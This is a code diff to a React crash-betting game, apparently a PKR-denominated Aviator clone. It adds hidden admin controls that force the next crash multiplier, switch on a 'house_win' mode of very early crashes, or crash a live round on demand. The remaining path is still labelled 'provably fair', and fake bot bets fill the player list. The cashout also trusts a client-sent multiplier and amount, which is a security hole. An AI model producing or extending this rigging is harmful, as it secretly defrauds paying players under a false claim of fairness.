@@ -52,6 +52,24 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
   const gameStateRef = useRef(gameState);
   const lastReactMultiplierUpdate = useRef(0);
 
+  // Stable references so balance updates never trigger component loop re-runs
+  const balanceRef = useRef(balance);
+  useEffect(() => {
+    balanceRef.current = balance;
+  }, [balance]);
+
+  const onBalanceUpdateRef = useRef(onBalanceUpdate);
+  useEffect(() => {
+    onBalanceUpdateRef.current = onBalanceUpdate;
+  }, [onBalanceUpdate]);
+
+  const userRef = useRef(user);
+  useEffect(() => {
+    userRef.current = user;
+  }, [user]);
+
+  const flyIntervalRef = useRef(null);
+
   // Aviator Flew Away Fly-Off Animation
   const flewAwayPos = useRef({ x: 0, y: 0, isFlyingOff: false });
 
@@ -211,6 +229,9 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
 
     let timer = null;
     let localRoundCrash = 2.0;
+    let liveForcedMultiplier = null;
+    let liveAviatorMode = 'fair';
+    let lastCrashNowSignal = 0;
 
     const botNames = [
       'Shahid_99', 'AlexPro', 'CryptoKing', 'Zeeshan77', 'Vikram_G', 'Dragon_X',
@@ -218,7 +239,46 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
       'Farhan_K', 'SpeedDemon', 'Tariq_77', 'Elena_V', 'BabarFan', 'Omega_Bet'
     ];
 
+    const fetchLiveGameControl = async () => {
+      try {
+        const res = await fetch('/api/crash/control');
+        if (res.ok) {
+          const data = await res.json();
+          if (data.forcedNextMultiplier) {
+            liveForcedMultiplier = Number(data.forcedNextMultiplier);
+          }
+          if (data.aviatorMode) {
+            liveAviatorMode = data.aviatorMode;
+          }
+          if (data.crashNowTriggered && data.crashNowTriggered > lastCrashNowSignal) {
+            lastCrashNowSignal = data.crashNowTriggered;
+            if (gameStateRef.current === 'FLYING' && flyIntervalRef.current) {
+              clearInterval(flyIntervalRef.current);
+              handleLocalCrash(smoothMultiplierRef.current || 1.01);
+            }
+          }
+        }
+      } catch (e) {}
+    };
+
     const generateRandomCrash = () => {
+      // 1. Check if admin forced multiplier for this round
+      if (liveForcedMultiplier !== null && liveForcedMultiplier >= 1.01) {
+        const forced = liveForcedMultiplier;
+        liveForcedMultiplier = null;
+        fetch('/api/crash/consume-forced', { method: 'POST' }).catch(() => {});
+        return forced;
+      }
+
+      // 2. Check admin rigging mode
+      if (liveAviatorMode === 'house_win') {
+        return parseFloat((1.02 + Math.random() * 0.23).toFixed(2)); // 1.02x - 1.25x
+      }
+      if (liveAviatorMode === 'high_run') {
+        return parseFloat((10.0 + Math.random() * 25.0).toFixed(2)); // 10.00x - 35.00x
+      }
+
+      // 3. Standard provably fair distribution
       const rand = Math.random();
       if (rand < 0.04) return 1.00;
       const point = parseFloat((0.96 / (1 - rand)).toFixed(2));
@@ -251,9 +311,26 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
       setMultiplier(1.00);
       setCrashedAt(null);
       flewAwayPos.current.isFlyingOff = false;
-      setBet1(prev => ({ ...prev, placedBet: null, hasCashedOut: false, cashoutPayout: 0 }));
-      setBet2(prev => ({ ...prev, placedBet: null, hasCashedOut: false, cashoutPayout: 0 }));
+
+      // Only reset bets for the fresh round (clear cashed-out status)
+      setBet1(prev => ({
+        ...prev,
+        placedBet: null,
+        hasCashedOut: false,
+        cashoutPayout: 0,
+        cashoutMultiplier: 0
+      }));
+      setBet2(prev => ({
+        ...prev,
+        placedBet: null,
+        hasCashedOut: false,
+        cashoutPayout: 0,
+        cashoutMultiplier: 0
+      }));
       setBets(generateBotBets());
+
+      // Query admin controls
+      fetchLiveGameControl();
 
       let count = 5.0;
       setCountdown(count);
@@ -282,6 +359,9 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
       targetMultiplierRef.current = 1.00;
       setMultiplier(1.00);
       flewAwayPos.current.isFlyingOff = false;
+      soundFx.playFlightSound();
+
+      let checkControlCounter = 0;
 
       const flyInterval = setInterval(() => {
         const elapsedSec = (Date.now() - flightStart) / 1000;
@@ -290,11 +370,18 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
         smoothMultiplierRef.current = currentM;
         setMultiplier(currentM);
 
+        // Check live admin game controls every ~500ms
+        checkControlCounter++;
+        if (checkControlCounter % 5 === 0) {
+          fetchLiveGameControl();
+        }
+
         // Auto cashout check for bet1 and bet2
         setBet1(prev => {
           if (prev.placedBet && !prev.hasCashedOut && prev.autoCashoutEnabled && currentM >= prev.autoCashout) {
             const payout = parseFloat((prev.placedBet.amount * prev.autoCashout).toFixed(2));
-            onBalanceUpdate(balance + payout);
+            const newBal = parseFloat((balanceRef.current + payout).toFixed(2));
+            onBalanceUpdateRef.current(newBal);
             soundFx.playCashout();
             confetti({ particleCount: 40, spread: 50, origin: { y: 0.7 } });
             return { ...prev, hasCashedOut: true, cashoutPayout: payout, cashoutMultiplier: prev.autoCashout };
@@ -305,7 +392,8 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
         setBet2(prev => {
           if (prev.placedBet && !prev.hasCashedOut && prev.autoCashoutEnabled && currentM >= prev.autoCashout) {
             const payout = parseFloat((prev.placedBet.amount * prev.autoCashout).toFixed(2));
-            onBalanceUpdate(balance + payout);
+            const newBal = parseFloat((balanceRef.current + payout).toFixed(2));
+            onBalanceUpdateRef.current(newBal);
             soundFx.playCashout();
             confetti({ particleCount: 40, spread: 50, origin: { y: 0.7 } });
             return { ...prev, hasCashedOut: true, cashoutPayout: payout, cashoutMultiplier: prev.autoCashout };
@@ -316,13 +404,17 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
         // Crash check
         if (currentM >= localRoundCrash) {
           clearInterval(flyInterval);
+          flyIntervalRef.current = null;
           handleLocalCrash(localRoundCrash);
         }
       }, 100);
+
+      flyIntervalRef.current = flyInterval;
       timer = flyInterval;
     };
 
     const handleLocalCrash = (crashedVal) => {
+      soundFx.stopFlightSound();
       setGameState('CRASHED');
       gameStateRef.current = 'CRASHED';
       setCrashedAt(crashedVal);
@@ -344,8 +436,10 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
     return () => {
       clearInterval(timer);
       clearTimeout(timer);
+      if (flyIntervalRef.current) clearInterval(flyIntervalRef.current);
+      soundFx.stopFlightSound();
     };
-  }, [socket, balance, onBalanceUpdate]);
+  }, [socket]);
 
 
   // ==================== OFFICIAL AVIATOR RED AIRPLANE CANVAS ====================
@@ -729,8 +823,8 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
   }, []);
 
   // ==================== BET ACTIONS ====================
-  const handlePlaceBet = (panelNum) => {
-    if (!user) return onOpenAuth('login');
+  const handlePlaceBet = async (panelNum) => {
+    if (!userRef.current) return onOpenAuth('login');
     const panel = panelNum === 1 ? bet1 : bet2;
     const setPanel = panelNum === 1 ? setBet1 : setBet2;
 
@@ -739,86 +833,134 @@ export default function CrashGame({ socket, user, balance, onBalanceUpdate, onOp
       alert('Minimum bet is PKR 10');
       return;
     }
-    if (numAmount > balance) {
+    if (numAmount > balanceRef.current) {
       alert('Insufficient balance! Please deposit to continue.');
       return;
     }
 
     soundFx.playBet();
 
-    if (!socket || !socket.connected) {
-      const newBal = balance - numAmount;
-      onBalanceUpdate(newBal);
-      const fakeBet = {
-        id: `local_user_bet_${Date.now()}`,
-        userId: user.id,
-        username: user.username,
-        amount: numAmount,
-        autoCashout: panel.autoCashoutEnabled ? panel.autoCashout : null
-      };
-      setPanel(prev => ({ ...prev, placedBet: fakeBet }));
-      setBets(prev => [fakeBet, ...prev]);
-      return;
-    }
+    // 1. Immediate UI deduction and optimistic placement
+    const newBal = parseFloat((balanceRef.current - numAmount).toFixed(2));
+    onBalanceUpdateRef.current(newBal);
 
-    const token = localStorage.getItem('luckywin_token');
-    socket.emit('crash:bet', {
-      token,
-      amount: panel.amount,
+    const localBet = {
+      id: `bet_${Date.now()}_${panelNum}`,
+      userId: userRef.current.id,
+      username: userRef.current.username,
+      amount: numAmount,
       autoCashout: panel.autoCashoutEnabled ? panel.autoCashout : null
-    }, (res) => {
-      if (res.success) {
-        setPanel(prev => ({ ...prev, placedBet: res.bet }));
-        onBalanceUpdate(res.newBalance);
-      } else {
-        alert(res.error || 'Failed to place bet');
+    };
+
+    setPanel(prev => ({
+      ...prev,
+      placedBet: localBet,
+      hasCashedOut: false,
+      cashoutPayout: 0,
+      cashoutMultiplier: 0
+    }));
+
+    setBets(prev => [localBet, ...prev]);
+
+    // 2. Call backend /api/crash/bet or socket
+    if (socket && socket.connected) {
+      const token = localStorage.getItem('luckywin_token');
+      socket.emit('crash:bet', {
+        token,
+        amount: panel.amount,
+        autoCashout: panel.autoCashoutEnabled ? panel.autoCashout : null
+      }, (res) => {
+        if (res?.success) {
+          setPanel(prev => ({ ...prev, placedBet: res.bet }));
+          if (res.newBalance !== undefined) onBalanceUpdateRef.current(res.newBalance);
+        }
+      });
+    } else {
+      const token = localStorage.getItem('luckywin_token');
+      if (token) {
+        fetch('/api/crash/bet', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            Authorization: `Bearer ${token}`
+          },
+          body: JSON.stringify({
+            amount: numAmount,
+            autoCashout: panel.autoCashoutEnabled ? panel.autoCashout : null
+          })
+        })
+        .then(r => r.ok ? r.json() : null)
+        .then(res => {
+          if (res && res.bet) {
+            setPanel(prev => ({ ...prev, placedBet: { ...localBet, id: res.bet.id } }));
+            if (res.newBalance !== undefined) {
+              onBalanceUpdateRef.current(res.newBalance);
+            }
+          }
+        })
+        .catch(() => {});
       }
-    });
+    }
   };
 
   const handleCashout = (panelNum) => {
     const panel = panelNum === 1 ? bet1 : bet2;
     const setPanel = panelNum === 1 ? setBet1 : setBet2;
-    if (!panel.placedBet) return;
+    if (!panel.placedBet || panel.hasCashedOut) return;
 
     const currentMultiplier = smoothMultiplierRef.current || multiplier;
-    if (!socket || !socket.connected) {
-      const payout = parseFloat((panel.amount * currentMultiplier).toFixed(2));
-      const newBal = balance + payout;
-      onBalanceUpdate(newBal);
-      setPanel(prev => ({
-        ...prev,
-        hasCashedOut: true,
-        cashoutPayout: payout,
-        cashoutMultiplier: currentMultiplier
-      }));
-      soundFx.playCashout();
-      confetti({
-        particleCount: 50,
-        spread: 60,
-        origin: { y: 0.7 }
-      });
-      return;
-    }
+    const payout = parseFloat((panel.placedBet.amount * currentMultiplier).toFixed(2));
+    const newBal = parseFloat((balanceRef.current + payout).toFixed(2));
+    onBalanceUpdateRef.current(newBal);
 
-    const token = localStorage.getItem('luckywin_token');
-    socket.emit('crash:cashout', {
-      token,
-      betId: panel.placedBet.id
-    }, (res) => {
-      if (res.success) {
-        setPanel(prev => ({
-          ...prev,
-          hasCashedOut: true,
-          cashoutPayout: res.payout,
-          cashoutMultiplier: res.multiplier
-        }));
-        onBalanceUpdate(res.newBalance);
-        soundFx.playCashout();
-      } else {
-        console.error(res.error);
-      }
+    setPanel(prev => ({
+      ...prev,
+      hasCashedOut: true,
+      cashoutPayout: payout,
+      cashoutMultiplier: currentMultiplier
+    }));
+
+    soundFx.playCashout();
+    confetti({
+      particleCount: 50,
+      spread: 60,
+      origin: { y: 0.7 }
     });
+
+    if (socket && socket.connected) {
+      const token = localStorage.getItem('luckywin_token');
+      socket.emit('crash:cashout', {
+        token,
+        betId: panel.placedBet.id
+      }, (res) => {
+        if (res?.success && res.newBalance !== undefined) {
+          onBalanceUpdateRef.current(res.newBalance);
+        }
+      });
+    } else {
+      const token = localStorage.getItem('luckywin_token');
+      if (token) {
+        fetch('/api/crash/cashout', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            Authorization: `Bearer ${token}`
+          },
+          body: JSON.stringify({
+            betId: panel.placedBet.id,
+            amount: panel.placedBet.amount,
+            multiplier: currentMultiplier
+          })
+        })
+        .then(r => r.ok ? r.json() : null)
+        .then(res => {
+          if (res && res.newBalance !== undefined) {
+            onBalanceUpdateRef.current(res.newBalance);
+          }
+        })
+        .catch(() => {});
+      }
+    }
   };
 
   const maskName = (name) => {
